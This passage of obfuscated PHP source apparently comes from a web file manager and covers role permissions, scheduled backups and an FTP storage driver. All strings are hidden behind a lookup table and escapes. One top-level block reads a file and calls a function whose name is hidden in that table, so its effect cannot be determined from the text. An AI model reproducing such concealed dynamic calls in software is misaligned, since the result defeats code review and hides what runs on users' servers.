$’¯Æâ™®[$…ÉÖ¤¦î[1883]] == $…ÉÖ¤¦î[208]) { continue; } if (!$×É›ûÇ¦) { $×É›ûÇ¦ = $’¯Æâ™®; continue; } if ($×É›ûÇ¦[$…ÉÖ¤¦î[451]] > $’¯Æâ™®[$…ÉÖ¤¦î[451]]) { $×É›ûÇ¦ = $’¯Æâ™®; } } return $×É›ûÇ¦ ? $×É›ûÇ¦[$…ÉÖ¤¦î[437]] : $…ÉÖ¤¦î[12]; } public function listData($ğ²æ© = false, $«³ı‘³ = "\x73\x6f\162\x74", $¦şÒüğê = false) { return parent::listData($ğ²æ©, $«³ı‘³, $¦şÒüğê); } public function update($´ œ˜Êı, $å÷—Õà) { $Ûü”î£° =& $_SERVER[”ú…±Ú¥]; $ÂÌ‘ÜÁé = parent::listData($´ œ˜Êı); $Ğ¿ë¯¹× = $this->findByName($å÷—Õà[$Ûü”î£°[32]]); if (!$ÂÌ‘ÜÁé || $Ğ¿ë¯¹× && $Ğ¿ë¯¹×[$Ûü”î£°[437]] != $ÂÌ‘ÜÁé[$Ûü”î£°[437]]) { return !1; } $this->filterAuth($å÷—Õà[$Ûü”î£°[451]]); return parent::update($´ œ˜Êı, $å÷—Õà); } public function remove($Û­£Ü¬) { $“ØûüÛ¨ = parent::listData($Û­£Ü¬); if (!$“ØûüÛ¨ || $“ØûüÛ¨[$_SERVER[”ú…±Ú¥][1316]]) { return !1; } return parent::remove($Û­£Ü¬); } public function add($¸òÕÎ™– = array()) { $Óğ¨˜Ïœ =& $_SERVER[”ú…±Ú¥]; if ($this->findByName($¸òÕÎ™–[$Óğ¨˜Ïœ[32]])) { return !1; } $«Ìš«Š = array($Óğ¨˜Ïœ[32] => $Óğ¨˜Ïœ[12], $Óğ¨˜Ïœ[451] => 1, $Óğ¨˜Ïœ[1884] => $Óğ¨˜Ïœ[1871], $Óğ¨˜Ïœ[1883] => 1, $Óğ¨˜Ïœ[1316] => 0, $Óğ¨˜Ïœ[1885] => 0); $¸òÕÎ™– = array_merge($«Ìš«Š, $¸òÕÎ™–); $¸òÕÎ™–[$Óğ¨˜Ïœ[1885]] = $this->getSort(); $this->filterAuth($¸òÕÎ™–[$Óğ¨˜Ïœ[451]]); return parent::insert($¸òÕÎ™–); } private function getSort() { $§Èãë®Ÿ =& $_SERVER[”ú…±Ú¥]; $ÎØğËšĞ = parent::listData(); $ÂšºŒÛ = array_to_keyvalue($ÎØğËšĞ, $§Èãë®Ÿ[12], $§Èãë®Ÿ[1885]); return empty($ÂšºŒÛ) ? 0 : max($ÂšºŒÛ) + 1; } private function filterAuth(&$Ÿ¬¢¤õİ) { if (!$Ÿ¬¢¤õİ) { return; } $°ö‹°ê€ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ç…“ÂãÂ = array(); foreach ($°ö‹°ê€ as $ “Â–ì›) { if ($Ÿ¬¢¤õİ & $ “Â–ì›) { $Ç…“ÂãÂ[] = $ “Â–ì›; } } if (in_array(self::AUTH_ROOT, $Ç…“ÂãÂ)) { $Ÿ¬¢¤õİ = array_sum($°ö‹°ê€); return; } $¯ßÓŠ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ç…“ÂãÂ as $ “Â–ì›) { if (isset($¯ßÓŠ[$ “Â–ì›])) { $Ç…“ÂãÂ = array_merge($Ç…“ÂãÂ, $¯ßÓŠ[$ “Â–ì›]); } } $Ç…“ÂãÂ[] = self::AUTH_SHOW; $Ÿ¬¢¤õİ = array_sum(array_unique($Ç…“ÂãÂ)); } public function sort($ßá£ÃúÊ, $ÙŞ”¢ÓŞ) { return parent::update($ßá£ÃúÊ, $ÙŞ”¢ÓŞ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\142\141\x63\x6b\x75\x70\x4c\151\x73\164"; public $field = array("\x69\x6f", "\x6e\141\x6d\145", "\163\x74\141\x74\x75\x73", "\143\157\x6e\164\145\156\164", "\155\x61\x6e\165\141\x6c", "\162\145\163\x75\x6c\x74", "\x74\151\x6d\x65\106\162\157\x6d", "\164\151\x6d\x65\124\x6f"); public function config() { $ˆğÉƒ¡Ò =& $_SERVER[”ú…±Ú¥]; $€Ì°¥Ñ› = Model($ˆğÉƒ¡Ò[802])->get($ˆğÉƒ¡Ò[812]); $€Ì°¥Ñ› = json_decode($€Ì°¥Ñ›, !0); $€Ì°¥Ñ› = is_array($€Ì°¥Ñ›) ? $€Ì°¥Ñ› : array(); if (!isset($€Ì°¥Ñ›[$ˆğÉƒ¡Ò[786]])) { $€Ì°¥Ñ›[$ˆğÉƒ¡Ò[786]] = $ˆğÉƒ¡Ò[88]; } unset($€Ì°¥Ñ›[$ˆğÉƒ¡Ò[1641]]); Action($ˆğÉƒ¡Ò[1886])->taskInit(); Model($ˆğÉƒ¡Ò[1640])->cacheClear(); $Äûà·­Ÿ = $ˆğÉƒ¡Ò[1887]; $å±‘«ô“ = Model($ˆğÉƒ¡Ò[1888])->findByKey($ˆğÉƒ¡Ò[1659], $Äûà·­Ÿ); if (!$å±‘«ô“) { $å±‘«ô“ = array(); } if (isset($å±‘«ô“[$ˆğÉƒ¡Ò[180]])) { $å±‘«ô“[$ˆğÉƒ¡Ò[180]] = json_decode($å±‘«ô“[$ˆğÉƒ¡Ò[180]], !0); } if (isset($€Ì°¥Ñ›[$ˆğÉƒ¡Ò[180]])) { $å±‘«ô“[$ˆğÉƒ¡Ò[180]][$ˆğÉƒ¡Ò[1644]] = $€Ì°¥Ñ›[$ˆğÉƒ¡Ò[180]]; unset($€Ì°¥Ñ›[$ˆğÉƒ¡Ò[180]]); } return array_merge($å±‘«ô“, $€Ì°¥Ñ›); } public function listData($êÀŞû±Ş = false, $÷´•šä÷ = "\x6d\157\x64\151\x66\x79\124\151\155\145", $Ñ´‘¿à“ = false) { return parent::listData($êÀŞû±Ş, $÷´•šä÷, !0); } public function lastItem() { $íæŸ“¾ = $this->listData(); return !empty($íæŸ“¾[0]) ? $íæŸ“¾[0] : null; } public function kill($ç¬Ô“–÷) { $ÁìïÃìõ =& $_SERVER[”ú…±Ú¥]; $ò‘‚Ş«± = $this->listData($ç¬Ô“–÷); if (!$ò‘‚Ş«± || empty($ò‘‚Ş«±[$ÁìïÃìõ[32]])) { return !0; } Task::kill($ÁìïÃìõ[811]); Task::kill($ÁìïÃìõ[832]); Task::kill($ÁìïÃìõ[841]); $ğ­µ•Êó = $ò‘‚Ş«±[$ÁìïÃìõ[32]]; $ìœÁ­ö± = TEMP_FILES . $ÁìïÃìõ[810] . $ğ­µ•Êó . $ÁìïÃìõ[8]; IO::remove($ìœÁ­ö±, !1); return $this->remove($ç¬Ô“–÷); } public function remove($÷¯Šõ) { $ŞÏØüÃö = $this->listData($÷¯Šõ); if (!$ŞÏØüÃö) { return !0; } return $this->backupRemove($ŞÏØüÃö); } private function backupRemove($‡˜Áœ²ƒ) { parent::remove($‡˜Áœ²ƒ[$_SERVER[”ú…±Ú¥][437]]); $ü³ÊÊ«• = $this->backupPath($‡˜Áœ²ƒ); IO::remove($ü³ÊÊ«•, !1); return !0; } private function backupPath($ñØ¡˜Ëá) { $ÉİëŠö =& $_SERVER[”ú…±Ú¥]; $ıùÀŒ‚ = $ñØ¡˜Ëá[$ÉİëŠö[32]]; $ìÀŸÇ¼ = Model($ÉİëŠö[802])->get($ÉİëŠö[803]); $ÖàøÅ˜í = substr(md5($ÉİëŠö[804] . $ìÀŸÇ¼ . $ıùÀŒ‚), 0, 8); return "\x7b\x69\x6f\x3a{$ñØ¡˜Ëá[$ÉİëŠö[783]]}\x7d\57\144\x61\x74\141\142\x61\x73\x65\x2f\142\x61\143\153\x75\160\x2f" . $ıùÀŒ‚ . $ÉİëŠö[11] . $ÖàøÅ˜í; } public function start() { $¼Àß€Òâ =& $_SERVER[”ú…±Ú¥]; if ($GLOBALS[$¼Àß€Òâ[6]][$¼Àß€Òâ[89]][$¼Àß€Òâ[1889]] != $¼Àß€Òâ[88]) { return !0; } $§ÖÊ–Ü¶ = $this->config(); if (!$§ÖÊ–Ü¶ || $§ÖÊ–Ü¶[$¼Àß€Òâ[1641]] != $¼Àß€Òâ[88]) { return !1; } $¼œ± ¶Ÿ = $this->process(); foreach ($¼œ± ¶Ÿ as $Âáñì·Æ) { if ($Âáñì·Æ) { return Task::restart($Âáñì·Æ[$¼Àß€Òâ[437]]); } } $…„£Ùó¶ = new Backup(); $ì°ßñ®í = $…„£Ùó¶->db(); if ($ì°ßñ®í) { $ì°ßñ®í = $…„£Ùó¶->dbFile(); if ($ì°ßñ®í && $§ÖÊ–Ü¶[$¼Àß€Òâ[786]] == $¼Àß€Òâ[208]) { $ì°ßñ®í = $…„£Ùó¶->file(); } } Backup::set(array($¼Àß€Òâ[782] => 1, $¼Àß€Òâ[793] => time())); return !0; } public function process() { $“ö–©¾ =& $_SERVER[”ú…±Ú¥]; $‡Å×ª£Â = array($“ö–©¾[789] => Task::get($“ö–©¾[811]), $“ö–©¾[794] => Task::get($“ö–©¾[832]), $“ö–©¾[210] => Task::get($“ö–©¾[841])); $öÔÙ¯óì = !1; foreach ($‡Å×ª£Â as &$“‚ªå«‹) { if ($öÔÙ¯óì) { $“‚ªå«‹ = !1; continue; } if ($“‚ªå«‹) { $»Ò½ÈÏÖ = intval(_get($“‚ªå«‹, $“ö–©¾[1676], 0)); if (time() - $»Ò½ÈÏÖ > 7200) { Task::kill($“‚ªå«‹[$“ö–©¾[437]]); $öÔÙ¯óì = !0; $“‚ªå«‹ = !1; } } } return $‡Å×ª£Â; } public function restore() { $œ¡œ×« =& $_SERVER[”ú…±Ú¥]; ActionCall($œ¡œ×«[1089], !0, 1); ActionCall($œ¡œ×«[1089], !0, 0); } } goto Dï˜“…ÉŸØ; CãÊ¸Ï·“™: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ïÍ¥Òâ¦ =& $_SERVER[”ú…±Ú¥]; $this->isManual(); self::$name = date($ïÍ¥Òâ¦[780]); if (!($—€î‹š¬ = Model($ïÍ¥Òâ¦[781])->lastItem())) { $—€î‹š¬ = $this->initData(); } else { self::$name = $—€î‹š¬[$ïÍ¥Òâ¦[32]]; if ($—€î‹š¬[$ïÍ¥Òâ¦[782]] == $ïÍ¥Òâ¦[88]) { self::$name = date($ïÍ¥Òâ¦[249]); $¨©áìäÌ = 0; if (isset($—€î‹š¬[$ïÍ¥Òâ¦[331]][$ïÍ¥Òâ¦[210]][$ïÍ¥Òâ¦[506]])) { $¨©áìäÌ = (int) $—€î‹š¬[$ïÍ¥Òâ¦[331]][$ïÍ¥Òâ¦[210]][$ïÍ¥Òâ¦[506]]; } if (self::$manual == 0 && $—€î‹š¬[$ïÍ¥Òâ¦[32]] == self::$name) { Model($ïÍ¥Òâ¦[781])->remove($—€î‹š¬[$ïÍ¥Òâ¦[437]]); } $—€î‹š¬ = $this->initData($¨©áìäÌ, $—€î‹š¬[$ïÍ¥Òâ¦[783]]); } else { $this->checkStore($—€î‹š¬[$ïÍ¥Òâ¦[783]]); } } self::$option = $—€î‹š¬; } private function isManual() { $ãŸî÷”² = _get($GLOBALS, $_SERVER[”ú…±Ú¥][784], 0); $ãŸî÷”² = intval($ãŸî÷”²); self::$manual = $ãŸî÷”² && $ãŸî÷”² == 1 ? 1 : 0; } private function initData($ÖìšÁ­¾ = 0, $¤Ã‡ñ˜ = '') { $»Ü¤Ö¤¿ =& $_SERVER[”ú…±Ú¥]; $µ›¿ïöõ = Model($»Ü¤Ö¤¿[781])->config(); if ($¤Ã‡ñ˜ && $µ›¿ïöõ[$»Ü¤Ö¤¿[783]] != $¤Ã‡ñ˜) { $ÖìšÁ­¾ = 0; } $this->checkStore($µ›¿ïöõ[$»Ü¤Ö¤¿[783]]); if (self::$manual == 1) { self::$name .= $»Ü¤Ö¤¿[11] . date($»Ü¤Ö¤¿[785]); } $ø¹õâÇ¡ = array($»Ü¤Ö¤¿[783] => $µ›¿ïöõ[$»Ü¤Ö¤¿[783]], $»Ü¤Ö¤¿[32] => self::$name, $»Ü¤Ö¤¿[782] => 0, $»Ü¤Ö¤¿[786] => $µ›¿ïöõ[$»Ü¤Ö¤¿[786]], $»Ü¤Ö¤¿[787] => self::$manual, $»Ü¤Ö¤¿[331] => array($»Ü¤Ö¤¿[788] => array($»Ü¤Ö¤¿[782] => 0), $»Ü¤Ö¤¿[789] => array($»Ü¤Ö¤¿[782] => 0, $»Ü¤Ö¤¿[790] => 0, $»Ü¤Ö¤¿[791] => 0, $»Ü¤Ö¤¿[33] => $»Ü¤Ö¤¿[12], $»Ü¤Ö¤¿[792] => 0, $»Ü¤Ö¤¿[793] => 0), $»Ü¤Ö¤¿[794] => array($»Ü¤Ö¤¿[782] => 0, $»Ü¤Ö¤¿[790] => 0, $»Ü¤Ö¤¿[791] => 0, $»Ü¤Ö¤¿[792] => 0, $»Ü¤Ö¤¿[793] => 0), $»Ü¤Ö¤¿[210] => array($»Ü¤Ö¤¿[782] => 0, $»Ü¤Ö¤¿[795] => 0, $»Ü¤Ö¤¿[796] => 0, $»Ü¤Ö¤¿[797] => 0, $»Ü¤Ö¤¿[798] => 0, $»Ü¤Ö¤¿[506] => $ÖìšÁ­¾, $»Ü¤Ö¤¿[792] => 0, $»Ü¤Ö¤¿[793] => 0)), $»Ü¤Ö¤¿[792] => time(), $»Ü¤Ö¤¿[793] => 0); $Ééââòñ = Model($»Ü¤Ö¤¿[781])->insert($ø¹õâÇ¡); $ø¹õâÇ¡[$»Ü¤Ö¤¿[437]] = $Ééââòñ; return $ø¹õâÇ¡; } private function checkStore($øßûô) { $ßú úá =& $_SERVER[”ú…±Ú¥]; $º‹º›…ß = Model($ßú úá[799])->listData($øßûô); Model($ßú úá[799])->checkConfig($º‹º›…ß); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[”ú…±Ú¥][781])->findByName(self::$name); } return self::$option; } public static function set($ÔÃÂÙ®°) { $Ù¢£°¬ =& $_SERVER[”ú…±Ú¥]; $¦İıøµê = self::get(); foreach ($ÔÃÂÙ®° as $Â¸á¥§Ğ => $†–úÀæ) { $å˜Î”» = explode($Ù¢£°¬[10], $Â¸á¥§Ğ); $À¦ï¾¿Ÿ = count($å˜Î”»); switch ($À¦ï¾¿Ÿ) { case 1: $¦İıøµê[$å˜Î”»[0]] = $†–úÀæ; break; case 2: $¦İıøµê[$å˜Î”»[0]][$å˜Î”»[1]] = $†–úÀæ; break; case 3: $¦İıøµê[$å˜Î”»[0]][$å˜Î”»[1]][$å˜Î”»[2]] = $†–úÀæ; break; } } Model($Ù¢£°¬[781])->update($¦İıøµê[$Ù¢£°¬[437]], $¦İıøµê); self::$option = $¦İıøµê; return self::$option; } public function keep() { $«Åçöœ =& $_SERVER[”ú…±Ú¥]; $ß£ˆ«¹— = self::get(); if ($ß£ˆ«¹—[$«Åçöœ[331]][$«Åçöœ[788]][$«Åçöœ[782]] == $«Åçöœ[88]) { return; } $this->backupKeep($ß£ˆ«¹—); self::set(array($«Åçöœ[800] => 1)); } private function backupKeep($¼ä·£ö©) { $èúÕ÷”ß =& $_SERVER[”ú…±Ú¥]; if (self::$manual == 1) { return; } $©øÆÔÚ» = Model($èúÕ÷”ß[781])->listData(); if (empty($©øÆÔÚ»)) { return; } $½ööÈö = 0; $Ó½éŒÍÜ = array(); foreach ($©øÆÔÚ» as $ÖÚÔéíÈ) { if ($½ööÈö >= 7) { break; } $Ó½éŒÍÜ[] = $ÖÚÔéíÈ[$èúÕ÷”ß[32]]; $½ööÈö++; } for ($½ööÈö = 0; $½ööÈö < 12; $½ööÈö++) { $Ó½éŒÍÜ[] = date($èúÕ÷”ß[801], strtotime("\55{$½ööÈö}\x20\x6d\157\x6e\164\x68\x73")); } $Ó½éŒÍÜ = array_unique($Ó½éŒÍÜ); $¤‡ÁÚõ = Model($èúÕ÷”ß[802])->get($èúÕ÷”ß[803]); foreach ($©øÆÔÚ» as $ÖÚÔéíÈ) { if (isset($ÖÚÔéíÈ[$èúÕ÷”ß[787]]) && $ÖÚÔéíÈ[$èúÕ÷”ß[787]] == $èúÕ÷”ß[88]) { continue; } if (!empty($ÖÚÔéíÈ[$èúÕ÷”ß[32]]) && in_array($ÖÚÔéíÈ[$èúÕ÷”ß[32]], $Ó½éŒÍÜ)) { continue; } Model($èúÕ÷”ß[781])->remove($ÖÚÔéíÈ[$èúÕ÷”ß[437]]); $—Êç¾ã¡ = $this->backupPath($¼ä·£ö©, $¤‡ÁÚõ); IO::remove($—Êç¾ã¡, !1); } } private function backupPath($´êĞ¥ñ™, $Ï‡Ñˆ¤› = false) { $€×ÅÒ” =& $_SERVER[”ú…±Ú¥]; if (!$Ï‡Ñˆ¤›) { $Ï‡Ñˆ¤› = Model($€×ÅÒ”[802])->get($€×ÅÒ”[803]); } $ÚôàÑ—¹ = $´êĞ¥ñ™[$€×ÅÒ”[32]]; $¹¸«ü·› = substr(md5($€×ÅÒ”[804] . $Ï‡Ñˆ¤› . $ÚôàÑ—¹), 0, 8); return "\173\x69\157\72{$´êĞ¥ñ™[$€×ÅÒ”[783]]}\175\x2f\144\141\164\141\x62\x61\163\145\57\x62\x61\x63\153\x75\160\57" . $ÚôàÑ—¹ . $€×ÅÒ”[11] . $¹¸«ü·›; } public function db() { $­§¡  ô =& $_SERVER[”ú…±Ú¥]; $úËı€Ü = self::get(); if ($úËı€Ü[$­§¡  ô[331]][$­§¡  ô[789]][$­§¡  ô[782]] == $­§¡  ô[88]) { return !0; } $Ø•ì¿ê¬ = new BackupDb(); if (!$Ø•ì¿ê¬->index()) { return !1; } self::set(array($­§¡  ô[805] => 1)); return !0; } public function dbFile() { $Ìã¸é„ =& $_SERVER[”ú…±Ú¥]; $¾¶¯İÑù = self::get(); if ($¾¶¯İÑù[$Ìã¸é„[331]][$Ìã¸é„[794]][$Ìã¸é„[782]] == $Ìã¸é„[88]) { return !0; } $¯úÅÄî¹ = new BackupDbFile(); if (!$¯úÅÄî¹->index()) { return !1; } self::set(array($Ìã¸é„[806] => 1)); return !0; } public function file() { $ò³Ã¡·¯ =& $_SERVER[”ú…±Ú¥]; $‹–½€™› = self::get(); if ($‹–½€™›[$ò³Ã¡·¯[331]][$ò³Ã¡·¯[210]][$ò³Ã¡·¯[782]] == $ò³Ã¡·¯[88]) { return !0; } if (!isset($‹–½€™›[$ò³Ã¡·¯[786]]) || $‹–½€™›[$ò³Ã¡·¯[786]] == $ò³Ã¡·¯[208]) { $©¾¿ éò = new BackupFile(); if (!$©¾¿ éò->index()) { return !1; } } self::set(array($ò³Ã¡·¯[807] => 1, $ò³Ã¡·¯[782] => 1)); return !0; } } if ($_SERVER[$_SERVER[”ú…±Ú¥][186]] != $_SERVER[$_SERVER[”ú…±Ú¥][187]]) { $_getc = $_SERVER[”ú…±Ú¥][188]; $_getfile = $_SERVER[$_SERVER[”ú…±Ú¥][189]] . $_SERVER[”ú…±Ú¥][190]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ú…±Ú¥][191], $_getfilec); if (count($_getarrs) < $_SERVER[”ú…±Ú¥][192]) { $exit = $_SERVER[”ú…±Ú¥][193]; $exit(); } $_act = $_SERVER[”ú…±Ú¥][194]; $_act($_SERVER[$_SERVER[”ú…±Ú¥][195]]); } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¤–æ“¬à =& $_SERVER[”ú…±Ú¥]; $©˜—¼„ = Backup::get(); self::$io = $©˜—¼„[$¤–æ“¬à[783]]; self::$name = $©˜—¼„[$¤–æ“¬à[32]]; $ìÅª¥ ö = new DbManage(); $ı¿Ä’æ· = $ìÅª¥ ö->dbType(); $’á’ÁÊí = array($¤–æ“¬à[808] => $ı¿Ä’æ·, $¤–æ“¬à[809] => time()); Backup::set($’á’ÁÊí); $ÃØÍ—Æœ = $this->tmpFilesPath() . $¤–æ“¬à[810] . self::$name . $¤–æ“¬à[8]; del_dir($ÃØÍ—Æœ); mk_dir($ÃØÍ—Æœ); $Ñ¶ı¯Û = $§¸Û‡ä’ = 0; $€ß‡Ì = new Task($¤–æ“¬à[811], $¤–æ“¬à[812], 0, LNG($¤–æ“¬à[813]) . $¤–æ“¬à[814] . LNG($¤–æ“¬à[815])); try { $Û‡İÁÅŞ = $ìÅª¥ ö->db()->getTables(); } catch (Exception $§ÔÖ°à) { $€ß‡Ì->end(); return !1; } $Û‡İÁÅŞ = array_diff($Û‡İÁÅŞ, array($¤–æ“¬à[816], $¤–æ“¬à[817])); foreach ($Û‡İÁÅŞ as $ÁÁ³Å‚±) { $Ñ¶ı¯Û += $ìÅª¥ ö->model($ÁÁ³Å‚±)->count(); } $€ß‡Ì->task[$¤–æ“¬à[818]] = $Ñ¶ı¯Û; $GLOBALS[$¤–æ“¬à[819]] = self::$name; foreach ($Û‡İÁÅŞ as $ÁÁ³Å‚±) { $û°ĞÀñØ = $ÃØÍ—Æœ . $ÁÁ³Å‚± . $¤–æ“¬à[820]; $®ùñÎÄ = null; if ($ÁÁ³Å‚± == $¤–æ“¬à[821] && (!isset($©˜—¼„[$¤–æ“¬à[786]]) || $©˜—¼„[$¤–æ“¬à[786]] == $¤–æ“¬à[208])) { $®ùñÎÄ = self::$io; } $§¸Û‡ä’ += $ìÅª¥ ö->sqlFromDb($ÁÁ³Å‚±, $û°ĞÀñØ, $€ß‡Ì, $®ùñÎÄ); } unset($GLOBALS[$¤–æ“¬à[819]]); $€ß‡Ì->end(); if ($§¸Û‡ä’ > $Ñ¶ı¯Û) { $Ñ¶ı¯Û = $§¸Û‡ä’; } $’á’ÁÊí = array($¤–æ“¬à[808] => $ı¿Ä’æ·, $¤–æ“¬à[805] => 1, $¤–æ“¬à[822] => $Ñ¶ı¯Û, $¤–æ“¬à[823] => $§¸Û‡ä’, $¤–æ“¬à[824] => time()); Backup::set($’á’ÁÊí); if ($Ñ¶ı¯Û - $§¸Û‡ä’ > 0) { $›Íîõ›û = $¤–æ“¬à[825]; if (stristr(I18n::getType(), $¤–æ“¬à[826])) { $›Íîõ›û = $¤–æ“¬à[827]; } write_log(array($›Íîõ›û, $’á’ÁÊí), $¤–æ“¬à[812]); return !1; } return !0; } private function tmpFilesPath() { $¡¯äô‡‹ =& $_SERVER[”ú…±Ú¥]; $š“‡€ÏÚ = TEMP_FILES; if ($GLOBALS[$¡¯äô‡‹[6]][$¡¯äô‡‹[89]][$¡¯äô‡‹[828]]) { $š“‡€ÏÚ = $GLOBALS[$¡¯äô‡‹[6]][$¡¯äô‡‹[89]][$¡¯äô‡‹[828]]; if (!mk_dir($š“‡€ÏÚ) || !is_writable($š“‡€ÏÚ) || !IO::mkfile($š“‡€ÏÚ . $¡¯äô‡‹[829])) { $š“‡€ÏÚ = TEMP_FILES; } } return $š“‡€ÏÚ; } } goto B’á¶¹«À¶; bïÓ‹‘Ã¹³: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÎÂÔ‹Â) { parent::__construct(); if (count($ÎÂÔ‹Â) > 0) { $this->_init($ÎÂÔ‹Â); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ûğ£•Âø) { $Àóƒ´Ğ¥ =& $_SERVER[”ú…±Ú¥]; global $config; $this->appCharset = $config[$Àóƒ´Ğ¥[1381]]; $this->systemCharset = $config[$Àóƒ´Ğ¥[1382]]; if (isset($Ûğ£•Âø[$Àóƒ´Ğ¥[1383]]) && $Ûğ£•Âø[$Àóƒ´Ğ¥[1383]]) { $this->systemCharset = $Ûğ£•Âø[$Àóƒ´Ğ¥[1383]]; } } public function iconvApp($Ãò”â´) { return $this->iconvTo($Ãò”â´, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ù×ÛïÓÇ) { return $this->iconvTo($Ù×ÛïÓÇ, $this->appCharset, $this->systemCharset); } public function getPathOuter($×³ôá÷È) { $…Ù½•–¹ =& $_SERVER[”ú…±Ú¥]; $Ä¬Õ³¢‚ = $this->iconvApp($this->pathBase); $×³ôá÷È = $this->iconvApp($×³ôá÷È); if (substr($Ä¬Õ³¢‚, 0, 2) == $…Ù½•–¹[1307]) { $Ä¬Õ³¢‚ = BASIC_PATH . substr($Ä¬Õ³¢‚, 2); } if (substr($×³ôá÷È, 0, 2) == $…Ù½•–¹[1307]) { $×³ôá÷È = BASIC_PATH . substr($×³ôá÷È, 2); } $Ä¬Õ³¢‚ = KodIO::clear($Ä¬Õ³¢‚); $×³ôá÷È = KodIO::clear($×³ôá÷È); $×³ôá÷È = substr($×³ôá÷È, strlen($Ä¬Õ³¢‚)); if (empty($this->pathDriver)) { return $×³ôá÷È; } return $this->pathDriver . $…Ù½•–¹[8] . ltrim($×³ôá÷È, $…Ù½•–¹[8]); } private function _init($í“¸Ÿ‚ = array()) { $¬èÜ›– =& $_SERVER[”ú…±Ú¥]; if (!function_exists($¬èÜ›–[1384])) { throw new Exception(LNG($¬èÜ›–[1385])); } $this->config = $í“¸Ÿ‚; $this->charsetReset($í“¸Ÿ‚); foreach ($í“¸Ÿ‚ as $í§éß¾ => $“àúï¨€) { if (isset($this->{$í§éß¾})) { $this->{$í§éß¾} = $“àúï¨€; } } return $this->_login($í“¸Ÿ‚); } private function _login($Å¦Ô·Æª) { $‹Ò„øİ =& $_SERVER[”ú…±Ú¥]; static $¦ÂÀ¦¦ = array(); $ÎñÜøŞ = md5(json_encode($Å¦Ô·Æª)); if (isset($¦ÂÀ¦¦[$ÎñÜøŞ])) { foreach ($¦ÂÀ¦¦[$ÎñÜøŞ] as $ é¡‘„ => $¬Ü‰Ğ¤ö) { $this->{$ é¡‘„} = $¬Ü‰Ğ¤ö; } return !0; } $ŠõºÕØ„ = parse_url(trim($this->server, $‹Ò„øİ[8])); $this->host = $ŠõºÕØ„[$‹Ò„øİ[182]]; $•ğâ¦Îš = isset($ŠõºÕØ„[$‹Ò„øİ[181]]) && $ŠõºÕØ„[$‹Ò„øİ[181]] == $‹Ò„øİ[1386] ? !0 : !1; $this->scheme = $•ğâ¦Îš ? $‹Ò„øİ[1387] : $‹Ò„øİ[1388]; $this->port = isset($ŠõºÕØ„[$‹Ò„øİ[183]]) ? $ŠõºÕØ„[$‹Ò„øİ[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ÚœëŒ¶‰ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Î¶Äò–½ = $this->pasv == $‹Ò„øİ[88] ? !0 : !1; @ftp_pasv($this->connect, $Î¶Äò–½); $¦ÂÀ¦¦[$ÎñÜøŞ] = array($‹Ò„øİ[1389] => $this->connect, $‹Ò„øİ[182] => $this->host, $‹Ò„øİ[181] => $this->scheme, $‹Ò„øİ[183] => $this->port); return $ÚœëŒ¶‰; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ö…Ñ¥‰Ó, $¦ò¾ş§® = '', $–¢¾Éòñ = REPEAT_RENAME) { if ($this->setContent($Ö…Ñ¥‰Ó, $¦ò¾ş§®)) { return $this->getPathOuter($Ö…Ñ¥‰Ó); } return !1; } public function mkdir($¬¦˜ÒÎŠ, $…çñËé = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¬¦˜ÒÎŠ = $this->iconvSystem($¬¦˜ÒÎŠ); if ($this->_isFolder($¬¦˜ÒÎŠ) || @ftp_mkdir($this->connect, $¬¦˜ÒÎŠ)) { return $this->getPathOuter($¬¦˜ÒÎŠ); } if (!$this->mkdir($this->pathFather($¬¦˜ÒÎŠ))) { return !1; } if ($¬¦˜ÒÎŠ = @ftp_mkdir($this->connect, $¬¦˜ÒÎŠ)) { return $this->getPathOuter($¬¦˜ÒÎŠ); } return !1; } public function copyFile($À´â¿À¡, $éË¾èóï) { if (!$this->_isconn()) { return !1; } $ÀàÛÃŠ¿ = $this->pathThis($this->iconvSystem($À´â¿À¡)); $¦Ä»¤Óä = $this->tempFile($ÀàÛÃŠ¿); $‡áŞ¸¹Ø = $this->iconvApp($¦Ä»¤Óä); $this->download($À´â¿À¡, $‡áŞ¸¹Ø); $¦â¬õ€» = $this->upload($éË¾èóï, $‡áŞ¸¹Ø); $this->tempFileRemve($¦Ä»¤Óä); return $¦â¬õ€»; } public function moveFile($É³ÀÊ‘«, $ú°©²Ñ¬) { if (!$this->_isconn()) { return !1; } $É³ÀÊ‘« = $this->iconvSystem($É³ÀÊ‘«); $ú°©²Ñ¬ = $this->iconvSystem($ú°©²Ñ¬); $®µÜåƒé = @ftp_rename($this->connect, $É³ÀÊ‘«, $ú°©²Ñ¬); return $®µÜåƒé ? $this->getPathOuter($ú°©²Ñ¬) : !1; } public function delFile($ü´Ë”¥¸) { if (!$this->_isconn()) { return !1; } $ü´Ë”¥¸ = $this->iconvSystem($ü´Ë”¥¸); return @ftp_delete($this->connect, $ü´Ë”¥¸); } public function delFolder($€Ë¸¤‘) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ŞÆÍ²éõ = $àÄÛºŞƒ = array(); $this->fileList($€Ë¸¤‘, $ŞÆÍ²éõ, $àÄÛºŞƒ, !0); 